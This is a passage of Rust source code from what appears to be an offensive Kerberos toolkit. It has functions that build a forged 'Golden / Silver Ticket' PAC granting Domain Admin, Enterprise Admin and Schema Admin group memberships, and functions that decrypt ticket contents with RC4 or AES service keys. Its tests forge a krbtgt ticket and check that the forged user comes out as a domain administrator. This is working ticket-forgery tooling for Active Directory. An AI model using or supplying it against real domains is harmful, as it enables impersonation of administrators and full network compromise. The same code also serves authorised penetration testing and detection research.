    writer.write_u8(domain_sid.revision);
    writer.write_u8(sub_count as u8);
    writer.write_fixed_array(&domain_sid.identifier_authority);
    for &sub in &domain_sid.sub_authorities {
        writer.write_u32(sub);
    }

    let ndr_body = writer.into_bytes();

    // Wrap in Type Serialization Version 1 headers:
    // CommonHeader (8 bytes) + PrivateHeader (8 bytes) = 16 bytes
    let mut out = Vec::with_capacity(16 + ndr_body.len());
    // CommonHeader: Version=1, Endianness=0x10, CommonHeaderLength=8, Filler=0xcccccccc
    out.push(1);
    out.push(0x10);
    out.extend_from_slice(&8u16.to_le_bytes());
    out.extend_from_slice(&0xCCCC_CCCCu32.to_le_bytes());

    // PrivateHeader: ObjectBufferLength=ndr_body.len(), Filler=0xcccccccc
    out.extend_from_slice(&(ndr_body.len() as u32).to_le_bytes());
    out.extend_from_slice(&0xCCCC_CCCCu32.to_le_bytes());

    out.extend_from_slice(&ndr_body);
    out
}

/// Constructs a Golden / Silver Ticket PAC (`[MS-PAC]`) with specified privileged group memberships.
pub fn build_golden_pac(
    domain: &str,
    username: &str,
    domain_sid: &RpcSid,
    user_rid: u32,
    groups: &[u32],
    auth_time_unix: i64,
) -> Pac {
    let mut pac = Pac::new();

    // 1. PAC_LOGON_INFO
    let logon_info = build_pac_logon_info(username, domain, domain_sid, user_rid, groups, auth_time_unix);
    pac.set_buffer(PAC_LOGON_INFO, logon_info);

    // 2. PAC_CLIENT_INFO
    let ft = (auth_time_unix * 10_000_000 + 116_444_736_000_000_000) as u64;
    let client_info = PacClientInfo {
        client_id: ft,
        name: username.to_string(),
    };
    pac.set_buffer(PAC_CLIENT_INFO_TYPE, client_info.to_bytes());

    // 3. PAC_ATTRIBUTES_INFO
    let attrs = PacAttributesInfo {
        flags_length: 32,
        flags: 1, // PAC_WAS_REQUESTED
    };
    pac.set_buffer(PAC_ATTRIBUTES_INFO, attrs.to_bytes());

    // 4. PAC_REQUESTOR_INFO
    let mut req_writer = NdrWriter::new();
    let mut user_sid = domain_sid.clone();
    user_sid.sub_authorities.push(user_rid);
    let sub_count = user_sid.sub_authorities.len() as u32;
    req_writer.write_u8(user_sid.revision);
    req_writer.write_u8(sub_count as u8);
    req_writer.write_fixed_array(&user_sid.identifier_authority);
    for &sub in &user_sid.sub_authorities {
        req_writer.write_u32(sub);
    }
    pac.set_buffer(PAC_REQUESTOR_INFO, req_writer.into_bytes());

    // 5. Server and PrivSvr Checksum placeholders
    let dummy_server = PacSignatureData {
        signature_type: CKSUMTYPE_HMAC_MD5,
        signature: vec![0u8; 16],
        rodc_identifier: None,
    };
    let dummy_privsvr = PacSignatureData {
        signature_type: CKSUMTYPE_HMAC_MD5,
        signature: vec![0u8; 16],
        rodc_identifier: None,
    };
    pac.set_buffer(PAC_SERVER_CHECKSUM, dummy_server.to_bytes());
    pac.set_buffer(PAC_PRIVSVR_CHECKSUM, dummy_privsvr.to_bytes());

    pac
}

/// Extracts and parses the `Pac` from raw Kerberos `AuthorizationData` ASN.1 DER.
pub fn extract_pac_from_authorization_data(auth_data: &[u8]) -> Result<Pac, CoreError> {
    let (tag, seq, _) = der::decode_tlv(auth_data)?;
    let content = if tag == 0x30 {
        seq
    } else {
        auth_data
    };

    let mut rem = content;
    while !rem.is_empty() {
        let (elem_tag, elem, next) = der::decode_tlv(rem)?;
        rem = next;
        if elem_tag != 0x30 {
            continue;
        }

        let mut ad_type = 0i64;
        let mut ad_data: Option<&[u8]> = None;

        let mut elem_rem = elem;
        while !elem_rem.is_empty() {
            let (tag, val, next_inner) = der::decode_tlv(elem_rem)?;
            elem_rem = next_inner;
            match tag & 0x1F {
                0 => ad_type = der::decode_integer(val)?,
                1 => {
                    let (_, octets, _) = der::decode_tlv(val)?;
                    ad_data = Some(octets);
                }
                _ => {}
            }
        }

        if let Some(data) = ad_data {
            if ad_type == 128 {
                // AD-WIN2K-PAC
                return Pac::parse(data);
            } else if ad_type == 1 {
                // AD-IF-RELEVANT: recurse into inner authorization data
                if let Ok(pac) = extract_pac_from_authorization_data(data) {
                    return Ok(pac);
                }
            }
        }
    }

    Err(CoreError::ProtocolError(
        "PAC (AD-WIN2K-PAC) not found in authorization-data".into(),
    ))
}

/// Decrypts the EncryptedData in a Kerberos `Ticket` using the service key (Key Usage 2)
/// and extracts the parsed `Pac`.
pub fn extract_pac_from_ticket(
    ticket_enc_cipher: &[u8],
    etype: i32,
    key: &[u8],
) -> Result<Pac, CoreError> {
    let pt = match etype {
        23 => {
            let k16: [u8; 16] = key.try_into().map_err(|_| {
                CoreError::ProtocolError("RC4 key must be 16 bytes (NT hash)".into())
            })?;
            rc4_hmac_decrypt(&k16, 2, ticket_enc_cipher)?
        }
        17 => {
            let k16: [u8; 16] = key.try_into().map_err(|_| {
                CoreError::ProtocolError("AES-128 key must be 16 bytes".into())
            })?;
            aes128_cts_hmac_sha1_96_decrypt(&k16, 2, ticket_enc_cipher)?
        }
        18 => {
            let k32: [u8; 32] = key.try_into().map_err(|_| {
                CoreError::ProtocolError("AES-256 key must be 32 bytes".into())
            })?;
            aes256_cts_hmac_sha1_96_decrypt(&k32, 2, ticket_enc_cipher)?
        }
        other => {
            return Err(CoreError::ProtocolError(format!(
                "Unsupported ticket encryption type: {}",
                other
            )));
        }
    };

    // Parse EncTicketPart ([APPLICATION 3] SEQUENCE)
    let (app_tag, app_val, _) = der::decode_tlv(&pt)?;
    let enc_body = if app_tag == 0x63 {
        let (_, body, _) = der::decode_tlv(app_val)?;
        body
    } else {
        app_val
    };

    let mut rem = enc_body;
    let mut auth_data_bytes = None;
    while !rem.is_empty() {
        let (tag, val, next) = der::decode_tlv(rem)?;
        rem = next;
        if (tag & 0x1F) == 10 {
            // [10] authorization-data
            auth_data_bytes = Some(val);
            break;
        }
    }

    let auth_data = auth_data_bytes.ok_or_else(|| {
        CoreError::ProtocolError("No authorization-data found in EncTicketPart".into())
    })?;

    extract_pac_from_authorization_data(auth_data)
}

/// Parses the `(etype, kvno, ciphertext)` from a Kerberos `Ticket` ([APPLICATION 1]) ASN.1 DER buffer.
pub fn parse_ticket_enc_part(ticket_der: &[u8]) -> Result<(i32, Option<u32>, Vec<u8>), CoreError> {
    let (app_tag, app_val, _) = der::decode_tlv(ticket_der)?;
    let ticket_body = if app_tag == 0x61 {
        let (_, body, _) = der::decode_tlv(app_val)?;
        body
    } else {
        ticket_der
    };

    let mut rem = ticket_body;
    let mut enc_part_val = None;
    while !rem.is_empty() {
        let (tag, val, next) = der::decode_tlv(rem)?;
        rem = next;
        if (tag & 0x1F) == 3 {
            enc_part_val = Some(val);
            break;
        }
    }

    let enc_part = enc_part_val.ok_or_else(|| {
        CoreError::ProtocolError("Missing enc-part [3] in Ticket".into())
    })?;

    let (_, enc_seq, _) = der::decode_tlv(enc_part)?;
    let mut enc_rem = enc_seq;
    let mut etype = 0i32;
    let mut kvno = None;
    let mut cipher = Vec::new();

    while !enc_rem.is_empty() {
        let (tag, val, next) = der::decode_tlv(enc_rem)?;
        enc_rem = next;
        match tag & 0x1F {
            0 => etype = der::decode_integer(val)? as i32,
            1 => kvno = Some(der::decode_integer(val)? as u32),
            2 => {
                let (_, octets, _) = der::decode_tlv(val)?;
                cipher = octets.to_vec();
            }
            _ => {}
        }
    }

    if cipher.is_empty() {
        return Err(CoreError::ProtocolError(
            "Empty cipher in Ticket enc-part".into(),
        ));
    }

    Ok((etype, kvno, cipher))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pac_roundtrip_and_signature_verification() {
        let sid = RpcSid::parse("S-1-5-21-12345678-12345678-12345678").unwrap();
        let groups = [513, 512, 520, 518, 519]; // Domain Users, Domain Admins, Enterprise Admins, etc.
        let mut pac = build_golden_pac("CORP.LOCAL", "Administrator", &sid, 500, &groups, 1700000000);

        let server_key = [0x55u8; 16];
        let privsvr_key = [0x77u8; 16];

        pac.sign_pac(&server_key, 23, &privsvr_key, 23).unwrap();

        let raw_pac = pac.build();
        assert!(raw_pac.len() > 100);

        let parsed = Pac::parse(&raw_pac).unwrap();
        assert_eq!(parsed.buffers.len(), pac.buffers.len());

        let client = parsed.get_client_info().unwrap();
        assert_eq!(client.name, "Administrator");

        let logon_info = parsed.get_logon_info().unwrap();
        assert_eq!(logon_info.effective_name, "Administrator");
        assert_eq!(logon_info.logon_domain_name, "CORP.LOCAL");
        assert_eq!(logon_info.user_id, 500);
        assert_eq!(logon_info.primary_group_id, 513);
        assert!(logon_info.is_domain_admin());
        assert!(logon_info.is_enterprise_admin());
        assert!(logon_info.is_schema_admin());
        assert!(logon_info.is_admin());

        let user_sid = logon_info.user_sid().unwrap();
        assert_eq!(user_sid.to_string(), "S-1-5-21-12345678-12345678-12345678-500");

        let req_sid = parsed.get_requestor_info().unwrap();
        assert_eq!(req_sid.to_string(), "S-1-5-21-12345678-12345678-12345678-500");

        let attrs = parsed.get_attributes_info().unwrap();
        assert_eq!(attrs.flags, 1);

        let verified = parsed.verify_pac(&server_key, 23, Some((&privsvr_key, 23))).unwrap();
        assert!(verified);

        // Verification with wrong key must fail
        let wrong_key = [0x99u8; 16];
        let verified_wrong = parsed.verify_pac(&wrong_key, 23, Some((&privsvr_key, 23))).unwrap();
        assert!(!verified_wrong);
    }

    #[test]
    fn test_pac_extraction_from_forged_ticket() {
        use crate::ticketer::{forge_ticket, TicketOptions};

        let sid = RpcSid::parse("S-1-5-21-3623811015-3361044348-30300820").unwrap();
        let key = [0xAAu8; 16];

        let opts = TicketOptions {
            domain: "CONTOSO.COM".into(),
            domain_sid: sid,
            username: "johndoe".into(),
            user_rid: 1105,
            group_rids: vec![513, 512],
            spn: vec!["krbtgt".into(), "CONTOSO.COM".into()],
            key: key.to_vec(),
            etype: 23,
            duration_hours: 10,
        };

        let ccache = forge_ticket(&opts).unwrap();
        assert!(!ccache.credentials.is_empty());
        let ticket = &ccache.credentials[0].ticket;
        assert!(!ticket.is_empty());

        let (etype, _kvno, cipher) = parse_ticket_enc_part(ticket).unwrap();
        assert_eq!(etype, 23);

        let pac = extract_pac_from_ticket(&cipher, etype, &key).unwrap();
        let logon_info = pac.get_logon_info().unwrap();
        assert_eq!(logon_info.effective_name, "johndoe");
        assert_eq!(logon_info.logon_domain_name, "CONTOSO.COM");
        assert_eq!(logon_info.user_id, 1105);
        assert!(logon_info.is_domain_admin());
    }
}
